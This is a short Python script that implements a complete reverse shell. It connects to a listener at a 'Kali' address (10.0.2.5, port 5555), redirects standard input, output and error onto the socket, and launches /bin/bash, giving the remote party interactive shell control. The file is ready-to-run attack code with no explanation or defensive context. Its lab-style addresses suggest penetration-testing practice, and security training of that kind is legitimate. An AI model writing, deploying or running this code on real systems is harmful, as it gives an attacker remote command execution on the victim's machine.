import socket
import subprocess
import os

# Configuration
kali_ip = "10.0.2.5"  # Replace with your Kali IP address
kali_port = 5555  # Ensure this is a valid port number

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((kali_ip, kali_port))

    # # # Redirect stdin, stdout, and stderr to the socket
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr

    # Execute bash shell
    subprocess.run(["/bin/bash"])

if __name__ == "__main__":
    reverse_shell()

